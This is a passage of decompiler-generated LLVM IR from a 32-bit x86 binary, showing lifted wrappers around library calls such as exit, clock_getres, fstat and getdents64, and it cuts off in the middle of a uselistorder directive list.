  store i32 %v1_8054493, i32* %v2_8054495, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805449d.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805449a

dec_label_pc_805449a:                             ; preds = %dec_label_pc_8054465, %dec_label_pc_805448e
  %v2_805449d = phi i32 [ %v0_8054466, %dec_label_pc_8054465 ], [ %v2_805449d.pre, %dec_label_pc_805448e ]
  %v0_805449a = phi i32 [ %v7_8054482, %dec_label_pc_8054465 ], [ -1, %dec_label_pc_805448e ]
  store i32 %v2_805449d, i32* @esi, align 4
  ret i32 %v0_805449a

; uselistorder directives
  uselistorder i32 %v7_8054482, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805449a, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_80544a0(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_80544a0:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_80544c8(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80544c8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80544c8 = load i32, i32* @ebx, align 4
  store i32 %v0_80544c8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80544db = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80544db, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_80544db, -4095
  br i1 %tmp10, label %dec_label_pc_80544f4, label %dec_label_pc_80544e8

dec_label_pc_80544e8:                             ; preds = %dec_label_pc_80544c8
  %v1_80544e8 = call i32 @function_8052779(i32 %v0_80544c8)
  %v0_80544ed = load i32, i32* %ebx.global-to-local, align 4
  %v1_80544ed = sub i32 0, %v0_80544ed
  %v2_80544ef = inttoptr i32 %v1_80544e8 to i32*
  store i32 %v1_80544ed, i32* %v2_80544ef, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80544f8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80544f4

dec_label_pc_80544f4:                             ; preds = %dec_label_pc_80544c8, %dec_label_pc_80544e8
  %v2_80544f8 = phi i32 [ %v0_80544c8, %dec_label_pc_80544c8 ], [ %v2_80544f8.pre, %dec_label_pc_80544e8 ]
  %v0_80544f4 = phi i32 [ %v4_80544db, %dec_label_pc_80544c8 ], [ -1, %dec_label_pc_80544e8 ]
  %v2_80544f6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80544f6, i32* @edx, align 4
  store i32 %v2_80544f8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80544f4

; uselistorder directives
  uselistorder i32 %v4_80544db, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80544f4, { 1, 0 }
}

define i32 @function_80544fa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80544fa:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80544fa = load i32, i32* @ebx, align 4
  store i32 %v0_80544fa, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_805450d = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_805450d, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_805450d, -4095
  br i1 %tmp13, label %dec_label_pc_8054528, label %dec_label_pc_805451a

dec_label_pc_805451a:                             ; preds = %dec_label_pc_80544fa
  %v1_805451a = call i32 @function_8052779(i32 %v0_80544fa)
  %v0_805451f = load i32, i32* @ebx, align 4
  %v1_805451f = sub i32 0, %v0_805451f
  %v2_8054521 = inttoptr i32 %v1_805451a to i32*
  store i32 %v1_805451f, i32* %v2_8054521, align 4
  %v2_8054540.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805453b

dec_label_pc_8054528:                             ; preds = %dec_label_pc_80544fa
  %v1_8054528 = icmp eq i32 %v4_805450d, 0
  %v1_805452a = icmp eq i1 %v1_8054528, false
  br i1 %v1_805452a, label %dec_label_pc_805453b, label %dec_label_pc_805452c

dec_label_pc_805452c:                             ; preds = %dec_label_pc_8054528
  %v4_8054533 = bitcast i32* %stack_var_-68 to i16*
  %v5_8054533 = call i32 @function_8054945(i16* %v4_8054533, i32 %arg2, i32 %v4_805450d, i32 %v4_805450d)
  %v0_805453b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805453b

dec_label_pc_805453b:                             ; preds = %dec_label_pc_8054528, %dec_label_pc_805451a, %dec_label_pc_805452c
  %v2_8054540 = phi i32 [ %v0_80544fa, %dec_label_pc_8054528 ], [ %v2_8054540.pre, %dec_label_pc_805451a ], [ %v0_80544fa, %dec_label_pc_805452c ]
  %v0_805453b = phi i32 [ %v4_805450d, %dec_label_pc_8054528 ], [ -1, %dec_label_pc_805451a ], [ %v0_805453b.pre, %dec_label_pc_805452c ]
  store i32 %v2_8054540, i32* @ebx, align 4
  ret i32 %v0_805453b

; uselistorder directives
  uselistorder i32 %v4_805450d, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_805453b, { 2, 0, 1 }
}

define i32 @function_8054542(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054542:
  %eax.global-to-local = alloca i32, align 4
  %v0_8054542 = load i32, i32* @edi, align 4
  %v0_8054543 = load i32, i32* @esi, align 4
  %v0_8054544 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8054549 = load i32, i32* @edx, align 4
  %v7_8054553 = inttoptr i32 %arg2 to i32*
  %v8_8054553 = call i32 @function_80545b1(i32 %arg1, i32* %v7_8054553, i32 %arg3, i32 %v0_8054549, i32 %v0_8054544, i32 %v0_8054543, i32 %v0_8054542)
  store i32 %v8_8054553, i32* %eax.global-to-local, align 4
  store i32 %v8_8054553, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_8054553, 1
  br i1 %tmp24, label %dec_label_pc_80545ab, label %dec_label_pc_8054561

dec_label_pc_8054561:                             ; preds = %dec_label_pc_8054542
  %v0_8054561 = load i32, i32* @ebx, align 4
  %v2_8054561 = add i32 %v0_8054561, %v8_8054553
  store i32 %v2_8054561, i32* @edi, align 4
  %v7_80545a74 = icmp ult i32 %v0_8054561, %v2_8054561
  br i1 %v7_80545a74, label %dec_label_pc_8054566, label %dec_label_pc_80545ab

dec_label_pc_8054566:                             ; preds = %dec_label_pc_8054561, %dec_label_pc_8054566
  %v0_8054566 = phi i32 [ %v2_80545a5, %dec_label_pc_8054566 ], [ %v0_8054561, %dec_label_pc_8054561 ]
  %v1_8054566 = add i32 %v0_8054566, 8
  %v2_8054566 = inttoptr i32 %v1_8054566 to i32*
  %v3_8054566 = load i32, i32* %v2_8054566, align 4
  store i32 %v3_8054566, i32* %eax.global-to-local, align 4
  %v2_8054569 = add i32 %v0_8054566, 4
  %v3_8054569 = inttoptr i32 %v2_8054569 to i32*
  store i32 %v3_8054566, i32* %v3_8054569, align 4
  %v0_805456c = load i32, i32* @ebx, align 4
  %v1_805456c = add i32 %v0_805456c, 16
  %v2_805456c = inttoptr i32 %v1_805456c to i32*
  %v3_805456c = load i32, i32* %v2_805456c, align 4
  store i32 %v3_805456c, i32* %eax.global-to-local, align 4
  %v1_805456f = trunc i32 %v3_805456c to i16
  %v3_805456f = add i32 %v0_805456c, 8
  %v4_805456f = inttoptr i32 %v3_805456f to i16*
  store i16 %v1_805456f, i16* %v4_805456f, align 2
  %v0_8054573 = load i32, i32* @ebx, align 4
  %v1_8054573 = add i32 %v0_8054573, 18
  %v2_8054573 = inttoptr i32 %v1_8054573 to i8*
  %v3_8054573 = load i8, i8* %v2_8054573, align 1
  %v4_8054573 = zext i8 %v3_8054573 to i32
  %v5_8054573 = load i32, i32* %eax.global-to-local, align 4
  %v6_8054573 = and i32 %v5_8054573, -256
  %v7_8054573 = or i32 %v6_8054573, %v4_8054573
  store i32 %v7_8054573, i32* %eax.global-to-local, align 4
  %v3_8054576 = add i32 %v0_8054573, 10
  %v4_8054576 = inttoptr i32 %v3_8054576 to i8*
  store i8 %v3_8054573, i8* %v4_8054576, align 1
  %v0_805457a = load i32, i32* @ebx, align 4
  %v1_805457a = add i32 %v0_805457a, 8
  %v2_805457a = inttoptr i32 %v1_805457a to i16*
  %v3_805457a = load i16, i16* %v2_805457a, align 2
  %v4_805457a = zext i16 %v3_805457a to i32
  %v1_805457e = add nsw i32 %v4_805457a, -19
  %v1_8054582 = add i32 %v0_805457a, 19
  %v1_8054586 = add i32 %v0_805457a, 11
  store i32 %v1_8054586, i32* %eax.global-to-local, align 4
  %v3_805458a = inttoptr i32 %v1_8054586 to i8*
  %v4_805458a = call i32 @function_80527a3(i8* %v3_805458a, i32 %v1_8054582, i32 %v1_805457e)
  store i32 %v4_805458a, i32* %eax.global-to-local, align 4
  %v0_8054592 = load i32, i32* @ebx, align 4
  %v1_8054592 = add i32 %v0_8054592, 8
  %v2_8054592 = inttoptr i32 %v1_8054592 to i16*
  %v3_8054592 = load i16, i16* %v2_8054592, align 2
  %v4_8054592 = zext i16 %v3_8054592 to i32
  store i32 %v4_8054592, i32* %eax.global-to-local, align 4
  %v3_8054599 = inttoptr i32 %v0_8054592 to i8*
  %v4_8054599 = call i32 @function_80527a3(i8* %v3_8054599, i32 %v0_8054592, i32 %v4_8054592)
  store i32 %v4_8054599, i32* %eax.global-to-local, align 4
  %v0_805459e = load i32, i32* @ebx, align 4
  %v1_805459e = add i32 %v0_805459e, 8
  %v2_805459e = inttoptr i32 %v1_805459e to i16*
  %v3_805459e = load i16, i16* %v2_805459e, align 2
  %v4_805459e = zext i16 %v3_805459e to i32
  store i32 %v4_805459e, i32* %eax.global-to-local, align 4
  %v2_80545a5 = add i32 %v4_805459e, %v0_805459e
  store i32 %v2_80545a5, i32* @ebx, align 4
  %v1_80545a7 = load i32, i32* @edi, align 4
  %v7_80545a7 = icmp ult i32 %v2_80545a5, %v1_80545a7
  br i1 %v7_80545a7, label %dec_label_pc_8054566, label %dec_label_pc_80545a7.dec_label_pc_80545ab.loopexit_crit_edge

dec_label_pc_80545a7.dec_label_pc_80545ab.loopexit_crit_edge: ; preds = %dec_label_pc_8054566
  %v0_80545ab.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80545ab

dec_label_pc_80545ab:                             ; preds = %dec_label_pc_8054561, %dec_label_pc_80545a7.dec_label_pc_80545ab.loopexit_crit_edge, %dec_label_pc_8054542
  %v0_80545ab = phi i32 [ %v8_8054553, %dec_label_pc_8054542 ], [ %v0_80545ab.pre.pre, %dec_label_pc_80545a7.dec_label_pc_80545ab.loopexit_crit_edge ], [ %v8_8054553, %dec_label_pc_8054561 ]
  store i32 %v0_80545ab, i32* %eax.global-to-local, align 4
  store i32 %v0_8054543, i32* @esi, align 4
  store i32 %v0_8054542, i32* @edi, align 4
  ret i32 %v0_80545ab

; uselistorder directives
  uselistorder i32 %v0_80545ab, { 1, 0 }
  uselistorder i32 %v2_80545a5, { 1, 2, 0 }
  uselistorder i32 %v0_8054592, { 1, 0, 2 }
  uselistorder i32 %v0_805457a, { 1, 0, 2 }
  uselistorder i32 %v0_8054566, { 1, 0 }
  uselistorder i32 %v0_8054561, { 0, 2, 1 }
  uselistorder i32 %v8_8054553, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_80527a3, { 2, 3, 1, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 11, { 13, 11, 12, 18, 7, 4, 8, 5, 9, 6, 10, 0, 1, 14, 15, 16, 17, 2, 3, 19, 20 }
  uselistorder label %dec_label_pc_80545ab, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054566, { 1, 0 }
}

define i32 @function_80545b1(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_80545b1:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_80545b4 = load i32, i32* @edi, align 4
  %v0_80545b6 = load i32, i32* @ebx, align 4
  %v15_80545b7 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_80545c0 = add i32 %arg3, 30
  store i32 %arg3, i32* @edx, align 4
  %v1_80545c6 = and i32 %v1_80545c0, -16
  %v2_80545c9 = sub i32 %v15_80545b7, %v1_80545c6
  %v1_80545cb = add i32 %v2_80545c9, 15
  %v1_80545cf = and i32 %v1_80545cb, -16
  %v1_80545d5 = inttoptr i32 %v1_80545cf to %linux_dirent64*
  store i32 %v1_80545cf, i32* %ecx.global-to-local, align 4
  %v2_80545d7 = add i32 %v2_80545c9, -4
  %v3_80545d7 = inttoptr i32 %v2_80545d7 to i32*
  store i32 %v0_80545b6, i32* %v3_80545d7, align 4
  %v0_80545d8 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_80545df = call i32 @getdents64(i32 %v0_80545d8, %linux_dirent64* %v1_80545d5, i32 %arg3)
  store i32 %v5_80545df, i32* %eax.global-to-local, align 4
  %v0_80545e1 = load i32, i32* @esp, align 4
  %v3_80545e1 = add i32 %v0_80545e1, 4
  %tmp41 = icmp ult i32 %v5_80545df, -4095
  br i1 %tmp41, label %dec_label_pc_80545fb, label %dec_label_pc_80545ec

dec_label_pc_80545ec:                             ; preds = %dec_label_pc_80545b1
  %v1_80545ec = call i32 @function_8052779(i32 %v5_80545df)
  store i32 %v1_80545ec, i32* %eax.global-to-local, align 4
  %v4_80545f1 = sub i32 0, %v5_80545df
  store i32 %v4_80545f1, i32* @edx, align 4
  %v2_80545f7 = inttoptr i32 %v1_80545ec to i32*
  store i32 %v4_80545f1, i32* %v2_80545f7, align 4
  br label %dec_label_pc_80546bd

dec_label_pc_80545fb:                             ; preds = %dec_label_pc_80545b1
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_80545cf, i32* @ebx, align 4
  %v5_80546ad = add i32 %v5_80545df, %v1_80545cf
  store i32 %v5_80546ad, i32* %eax.global-to-local, align 4
  %v7_80546b030 = icmp ult i32 %v1_80545cf, %v5_80546ad
  br i1 %v7_80546b030, label %dec_label_pc_805461a.lr.ph, label %dec_label_pc_80546b8

dec_label_pc_805461a.lr.ph:                       ; preds = %dec_label_pc_80545fb
  %v5_8054627 = add i32 %tmp14, %arg3
  br label %dec_label_pc_805461a

dec_label_pc_805461a:                             ; preds = %dec_label_pc_805461a.lr.ph, %dec_label_pc_805465c
  %stack_var_-32.036 = phi i32 [ -1, %dec_label_pc_805461a.lr.ph ], [ %v3_805465f, %dec_label_pc_805465c ]
  %stack_var_-36.035 = phi i32 [ -1, %dec_label_pc_805461a.lr.ph ], [ %v3_805465c, %dec_label_pc_805465c ]
  %v0_805466834 = phi i32 [ %v1_80545cf, %dec_label_pc_805461a.lr.ph ], [ %v2_80546a5, %dec_label_pc_805465c ]
  %v1_805466d33 = phi i32 [ %tmp14, %dec_label_pc_805461a.lr.ph ], [ %v2_805462a, %dec_label_pc_805465c ]
  %v0_805463432 = phi i32 [ %v3_80545e1, %dec_label_pc_805461a.lr.ph ], [ %v1_80546a7, %dec_label_pc_805465c ]
  %v1_805461a = add i32 %v0_805466834, 16
  %v2_805461a = inttoptr i32 %v1_805461a to i16*
  %v3_805461a = load i16, i16* %v2_805461a, align 2
  %v4_805461a = zext i16 %v3_805461a to i32
  %v1_805461e = add nuw nsw i32 %v4_805461a, 3
  %v1_8054624 = and i32 %v1_805461e, 131068
  store i32 %v1_8054624, i32* %ecx.global-to-local, align 4
  store i32 %v5_8054627, i32* %eax.global-to-local, align 4
  %v2_805462a = add i32 %v1_8054624, %v1_805466d33
  %tmp42 = icmp ugt i32 %v2_805462a, %v5_8054627
  br i1 %tmp42, label %dec_label_pc_8054634, label %dec_label_pc_805465c

dec_label_pc_8054634:                             ; preds = %dec_label_pc_805461a
  %v1_8054634 = add i32 %v0_805463432, -4
  %v2_8054634 = inttoptr i32 %v1_8054634 to i32*
  store i32 0, i32* %v2_8054634, align 4
  %v5_8054636 = add i32 %v0_805463432, -8
  %v6_8054636 = inttoptr i32 %v5_8054636 to i32*
  store i32 %stack_var_-32.036, i32* %v6_8054636, align 4
  %v5_8054639 = add i32 %v0_805463432, -12
  %v6_8054639 = inttoptr i32 %v5_8054639 to i32*
  store i32 %stack_var_-36.035, i32* %v6_8054639, align 4
  %v5_805463c = add i32 %v0_805463432, -16
  %v6_805463c = inttoptr i32 %v5_805463c to i32*
  store i32 %arg1, i32* %v6_805463c, align 4
  %v1_805463f = call i32 @function_80547c7(i32 %v2_805462a)
  store i32 %v1_805463f, i32* %eax.global-to-local, align 4
  %v0_8054647 = load i32, i32* @esi, align 4
  %v15_8054647 = icmp eq i32 %v0_8054647, %tmp14
  %v1_805464a = icmp eq i1 %v15_8054647, false
  br i1 %v1_805464a, label %dec_label_pc_80546b8, label %dec_label_pc_805464c

dec_label_pc_805464c:                             ; preds = %dec_label_pc_8054634
  %v1_805464c = call i32 @function_8052779(i32 %v2_805462a)
  store i32 %v1_805464c, i32* %eax.global-to-local, align 4
  %v1_8054651 = inttoptr i32 %v1_805464c to i32*
  store i32 22, i32* %v1_8054651, align 4
  br label %dec_label_pc_80546bd

dec_label_pc_805465c:                             ; preds = %dec_label_pc_805461a
  %v1_805465c = add i32 %v0_805466834, 8
  %v2_805465c = inttoptr i32 %v1_805465c to i32*
  %v3_805465c = load i32, i32* %v2_805465c, align 4
  store i32 %v3_805465c, i32* %eax.global-to-local, align 4
  %v1_805465f = add i32 %v0_805466834, 12
  %v2_805465f = inttoptr i32 %v1_805465f to i32*
  %v3_805465f = load i32, i32* %v2_805465f, align 4
  %v1_8054668 = inttoptr i32 %v0_805466834 to i32*
  %v2_8054668 = load i32, i32* %v1_8054668, align 4
  store i32 %v2_8054668, i32* %eax.global-to-local, align 4
  %v1_805466a = add i32 %v0_805466834, 4
  %v2_805466a = inttoptr i32 %v1_805466a to i32*
  %v3_805466a = load i32, i32* %v2_805466a, align 4
  %v2_805466d = add i32 %v1_805466d33, 4
  %v3_805466d = inttoptr i32 %v2_805466d to i32*
  store i32 %v3_805466a, i32* %v3_805466d, align 4
  %v0_8054670 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054670 = load i32, i32* @esi, align 4
  %v2_8054670 = inttoptr i32 %v1_8054670 to i32*
  store i32 %v0_8054670, i32* %v2_8054670, align 4
  %v0_8054672 = load i32, i32* @ebx, align 4
  %v1_8054672 = add i32 %v0_8054672, 8
  %v2_8054672 = inttoptr i32 %v1_8054672 to i32*
  %v3_8054672 = load i32, i32* %v2_8054672, align 4
  store i32 %v3_8054672, i32* %eax.global-to-local, align 4
  %v1_8054675 = add i32 %v0_8054672, 12
  %v2_8054675 = inttoptr i32 %v1_8054675 to i32*
  %v3_8054675 = load i32, i32* %v2_8054675, align 4
  store i32 %v3_8054675, i32* @edx, align 4
  %v1_8054678 = load i32, i32* @esi, align 4
  %v2_8054678 = add i32 %v1_8054678, 12
  %v3_8054678 = inttoptr i32 %v2_8054678 to i32*
  store i32 %v3_8054675, i32* %v3_8054678, align 4
  %v0_805467b = load i32, i32* %eax.global-to-local, align 4
  %v1_805467b = load i32, i32* @esi, align 4
  %v2_805467b = add i32 %v1_805467b, 8
  %v3_805467b = inttoptr i32 %v2_805467b to i32*
  store i32 %v0_805467b, i32* %v3_805467b, align 4
  %v0_805467e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805467e = trunc i32 %v0_805467e to i16
  %v2_805467e = load i32, i32* @esi, align 4
  %v3_805467e = add i32 %v2_805467e, 16
  %v4_805467e = inttoptr i32 %v3_805467e to i16*
  store i16 %v1_805467e, i16* %v4_805467e, align 2
  %v0_8054682 = load i32, i32* @ebx, align 4
  %v1_8054682 = add i32 %v0_8054682, 18
  %v2_8054682 = inttoptr i32 %v1_8054682 to i8*
  %v3_8054682 = load i8, i8* %v2_8054682, align 1
  %v4_8054682 = zext i8 %v3_8054682 to i32
  %v5_8054682 = load i32, i32* %eax.global-to-local, align 4
  %v6_8054682 = and i32 %v5_8054682, -256
  %v7_8054682 = or i32 %v6_8054682, %v4_8054682
  store i32 %v7_8054682, i32* %eax.global-to-local, align 4
  %v2_8054685 = load i32, i32* @esi, align 4
  %v3_8054685 = add i32 %v2_8054685, 18
  %v4_8054685 = inttoptr i32 %v3_8054685 to i8*
  store i8 %v3_8054682, i8* %v4_8054685, align 1
  %v0_8054688 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054688 = load i32, i32* @esp, align 4
  %v2_8054688 = add i32 %v1_8054688, -4
  %v3_8054688 = inttoptr i32 %v2_8054688 to i32*
  store i32 %v0_8054688, i32* %v3_8054688, align 4
  %v0_8054689 = load i32, i32* @ebx, align 4
  %v1_8054689 = add i32 %v0_8054689, 16
  %v2_8054689 = inttoptr i32 %v1_8054689 to i16*
  %v3_8054689 = load i16, i16* %v2_8054689, align 2
  %v4_8054689 = zext i16 %v3_8054689 to i32
  %v1_805468d = add nsw i32 %v4_8054689, -19
  %v2_8054690 = add i32 %v1_8054688, -8
  %v3_8054690 = inttoptr i32 %v2_8054690 to i32*
  store i32 %v1_805468d, i32* %v3_8054690, align 4
  %v0_8054691 = load i32, i32* @ebx, align 4
  %v1_8054691 = add i32 %v0_8054691, 19
  %v2_8054694 = add i32 %v1_8054688, -12
  %v3_8054694 = inttoptr i32 %v2_8054694 to i32*
  store i32 %v1_8054691, i32* %v3_8054694, align 4
  %v0_8054695 = load i32, i32* @esi, align 4
  %v1_8054695 = add i32 %v0_8054695, 19
  store i32 %v1_8054695, i32* %eax.global-to-local, align 4
  %v2_8054698 = add i32 %v1_8054688, -16
  %v3_8054698 = inttoptr i32 %v2_8054698 to i32*
  store i32 %v1_8054695, i32* %v3_8054698, align 4
  %v3_8054699 = inttoptr i32 %v2_805462a to i16*
  %v4_8054699 = call i32 @function_80549c2(i16* %v3_8054699, i32 %v3_805465c, i32 %v3_805465f)
  store i32 %v4_8054699, i32* %eax.global-to-local, align 4
  %v0_805469e = load i32, i32* @ebx, align 4
  %v1_805469e = add i32 %v0_805469e, 16
  %v2_805469e = inttoptr i32 %v1_805469e to i16*
  %v3_805469e = load i16, i16* %v2_805469e, align 2
  %v4_805469e = zext i16 %v3_805469e to i32
  store i32 %v2_805462a, i32* @esi, align 4
  %v2_80546a5 = add i32 %v4_805469e, %v0_805469e
  store i32 %v2_80546a5, i32* @ebx, align 4
  %v0_80546a7 = load i32, i32* @esp, align 4
  %v1_80546a7 = add i32 %v0_80546a7, 16
  store i32 %v5_80546ad, i32* %eax.global-to-local, align 4
  %v7_80546b0 = icmp ult i32 %v2_80546a5, %v5_80546ad
  br i1 %v7_80546b0, label %dec_label_pc_805461a, label %dec_label_pc_80546b8

dec_label_pc_80546b8:                             ; preds = %dec_label_pc_80545fb, %dec_label_pc_805465c, %dec_label_pc_8054634
  %v0_80546b8 = phi i32 [ %v0_8054647, %dec_label_pc_8054634 ], [ %tmp14, %dec_label_pc_80545fb ], [ %v2_805462a, %dec_label_pc_805465c ]
  store i32 %v0_80546b8, i32* %eax.global-to-local, align 4
  %v5_80546ba = sub i32 %v0_80546b8, %tmp14
  br label %dec_label_pc_80546bd

dec_label_pc_80546bd:                             ; preds = %dec_label_pc_805464c, %dec_label_pc_80545ec, %dec_label_pc_80546b8
  %storemerge = phi i32 [ %v5_80546ba, %dec_label_pc_80546b8 ], [ -1, %dec_label_pc_80545ec ], [ -1, %dec_label_pc_805464c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80545b6, i32* @ebx, align 4
  store i32 %v0_80545b4, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_80546b8, { 1, 0 }
  uselistorder i32 %v2_80546a5, { 0, 2, 1 }
  uselistorder i32 %v3_805465f, { 1, 0 }
  uselistorder i32 %v3_805465c, { 1, 2, 0 }
  uselistorder i32 %v2_805462a, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_805463432, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805466834, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_80546ad, { 2, 3, 0, 1 }
  uselistorder i32 %v5_80545df, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 3, 0, 4 }
  uselistorder i32 (i16*, i32, i32)* @function_80549c2, { 5, 2, 3, 4, 0, 1 }
  uselistorder i32 19, { 8, 9, 10, 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32 18, { 10, 11, 12, 6, 1, 3, 2, 4, 0, 5, 7, 8, 9 }
  uselistorder i32 22, { 13, 14, 5, 6, 7, 15, 3, 4, 8, 9, 10, 11, 12, 0, 1, 2 }
  uselistorder i32 -12, { 17, 37, 93, 94, 21, 22, 50, 51, 52, 53, 39, 18, 45, 48, 49, 46, 43, 20, 41, 19, 38, 47, 23, 54, 55, 44, 42, 40, 24, 56, 57, 25, 26, 58, 59, 60, 61, 62, 36, 27, 32, 29, 28, 66, 67, 0, 68, 1, 2, 86, 81, 82, 83, 33, 34, 80, 35, 84, 85, 69, 3, 4, 30, 31, 5, 70, 71, 6, 7, 72, 8, 73, 9, 10, 74, 11, 75, 12, 13, 76, 14, 77, 15, 78, 79, 63, 64, 65, 87, 88, 89, 90, 91, 16, 92 }
  uselistorder i32 -8, { 0, 8, 80, 76, 78, 77, 79, 81, 82, 22, 23, 24, 25, 26, 27, 10, 11, 17, 20, 21, 18, 15, 2, 13, 1, 9, 19, 28, 29, 30, 16, 14, 12, 3, 31, 32, 4, 33, 34, 35, 36, 37, 38, 73, 5, 58, 45, 6, 42, 43, 44, 68, 62, 63, 64, 59, 60, 61, 65, 66, 67, 46, 47, 7, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 39, 40, 41, 69, 70, 71, 72, 74, 75 }
  uselistorder i32* @esp, { 193, 194, 195, 6, 7, 8, 9, 10, 331, 332, 0, 53, 54, 55, 56, 57, 58, 59, 60, 13, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 11, 123, 15, 125, 126, 127, 106, 107, 128, 129, 130, 131, 132, 94, 95, 96, 97, 98, 43, 44, 45, 46, 47, 89, 90, 91, 92, 93, 99, 100, 102, 103, 134, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 48, 49, 50, 51, 52, 133, 78, 79, 80, 81, 82, 83, 84, 77, 85, 86, 87, 88, 101, 104, 105, 120, 121, 122, 135, 136, 137, 14, 163, 162, 138, 139, 140, 141, 142, 143, 124, 144, 145, 146, 147, 148, 149, 158, 159, 160, 150, 151, 152, 153, 154, 155, 156, 157, 12, 161, 1, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 2, 3, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 16, 213, 17, 214, 18, 215, 19, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 20, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 265, 264, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 297, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 4, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 22, 333, 334, 335, 336, 327, 328, 329, 330, 27, 337, 338, 339, 340, 26, 345, 346, 347, 348, 37, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 341, 342, 343, 344, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 28, 374, 375, 376, 38, 377, 378, 379, 380, 381, 382, 383, 385, 384, 5, 386, 387, 388, 389, 390, 391, 392, 393, 25, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 36, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 21, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 30, 29, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 31, 457, 458, 459, 460, 461, 462, 463, 32, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 33, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 34, 484, 485, 35, 486, 487, 488, 489, 490, 491, 492, 493, 494, 24, 39, 495, 496, 497, 498, 499, 500, 501, 40, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 